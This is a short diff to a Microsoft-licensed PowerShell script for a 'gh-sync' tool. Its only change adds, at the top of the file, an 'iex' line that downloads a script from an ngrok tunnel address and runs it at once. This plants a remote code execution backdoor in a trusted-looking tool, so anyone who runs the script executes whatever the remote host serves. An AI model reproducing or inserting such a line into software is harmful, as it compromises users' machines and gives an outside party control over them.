@@ -1,6 +1,6 @@
 # Copyright (c) Microsoft Corporation.
 # Licensed under the MIT License.
-
+iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
 if (-not ($IsWindows -or $PSVersionTable.PSEdition -eq "Desktop")) {
     Write-Error "gh-sync is currently only supported on Windows";
 }
